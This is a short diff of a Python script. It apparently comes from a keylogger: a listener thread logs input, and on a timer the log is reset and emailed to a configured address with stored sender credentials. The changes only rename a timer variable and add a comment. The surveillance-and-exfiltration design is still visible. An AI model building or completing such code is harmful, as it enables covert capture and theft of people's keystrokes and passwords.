@@ -5,8 +5,9 @@ import logging
 import sendEmail
 
 
-# Global variable that sets the number of seconds/minutes beofre the log file is reset and sent over by email
-NUMMINREF = 60
+# Global variable that sets the number of seconds beofre the log file is reset and sent over by email
+NUMSEC = 60
+# Addresses for sending and receiving the email 
 TOADDRESS =  "Enter email here"
 FROMADDRESS = "Enter email here"
 FROMPASSWORD = "Enter from address\' password here"
@@ -30,5 +31,5 @@ if __name__ == "__main__":
 	    	logging.shutdown()
 	    	createFile()
 	    	time_out(period_sec)
-	    Thread(target=time_out, args=(NUMMINREF,)).start()
+	    Thread(target=time_out, args=(NUMSEC,)).start()
 	    listener.join()
